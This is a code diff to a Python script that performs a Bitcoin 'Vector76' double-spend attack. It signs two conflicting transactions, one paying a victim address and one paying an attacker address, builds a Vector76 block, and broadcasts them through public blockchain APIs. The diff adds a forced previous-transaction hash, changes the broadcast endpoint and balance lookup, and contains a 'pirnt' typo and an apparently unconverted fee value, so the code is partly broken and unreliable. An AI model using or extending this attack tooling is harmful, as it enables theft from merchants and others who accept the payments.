@@ -40,15 +40,18 @@ parser.add_argument("--fee",
                     help="BTC send fee. (Default=0.00015)",
                     default=0.00015,
                     type=float)
+parser.add_argument("--last_txid",
+                    help="Last txid (address of attacker_signkey)",
+                    type=str)
 
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
     return round(btc_amount / satoshi)
 
 def broadcast_transaction(raw_tx, testnet):
-    url = "https://blockchain.info/pushtx"
-    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-    payload = {'tx': raw_tx}
+    url = "https://blockstream.info/api/tx"
+    headers = {'Content-Type': 'text/plain'}
+    payload = raw_tx
     if testnet:
         url = "https://blockstream.info/testnet/api/tx"
         headers = {'Content-Type': 'text/plain'}
@@ -74,8 +77,8 @@ attacker_address = args.attacker_address
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
 fee        = args.fee
-
-fee = to_satoshi(fee)
+fee        = args.fee
+last_txid  = args.last_txid
 
 transaction_util = cryptos.Bitcoin(testnet=testnet)
 print("Connecting Public Node...")
@@ -91,29 +94,19 @@ if send_amount < fee:
     print("[!] The fees exceed the amount sent. Please review the amount of fees and amount of BTC.")
     exit()
 
-try:
-    rpc_node.call("loadwallet", "ImagineBreaker")
-    rpc_node.call("importprivkey", key)
-except:
-    try:
-        rpc_node.call("createwallet", "ImagineBreaker") # おまけ まずは... そのブロックチェーン取引をぶち殺す!! 
-    except:
-        rpc_node.call("importprivkey", key)
-    try:
-        rpc_node.call("loadwallet", "ImagineBreaker")
-        rpc_node.call("importprivkey", key)
-    except:
-        pass
-
 change_address = transaction_util.wiftoaddr(key)
-balance = rpc_node.getreceivedbyaddress(change_address)
+balance = transaction_util.get_balance(change_address)
+print(f"Balance : {balance}")
+
 change_btc_amt = (balance - (send_amount - fee)) #おつり
 tx_victim = [{"address": victim_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
 tx_victim = transaction_util.mktx(inputs, tx_victim)
+tx_victim["ins"][0]["prev_hash"] = last_txid
 print(tx_victim)
 tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, key))
 tx_attacker = [{"address": attacker_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
 tx_attacker = transaction_util.mktx(inputs, tx_attacker)
+tx_attacker["ins"][0]["prev_hash"] = last_txid
 tx_attacker = cryptos.serialize(transaction_util.sign(tx_attacker, 0, key))
 print()
 print(tx_attacker)
@@ -141,6 +134,7 @@ print(f"Signed V1 RawTx           : {tx_victim}")
 print(f"Signed V2 RawTx           : {tx_attacker}")
 print(f"Vector76  Block           : {tx_vector76}")
 print(f"Mined Vector76 Block      : {vector76_response}")
+pirnt(f"Testnet Mode              : {testnet}")
 print("--------------------")
 print()
 print()
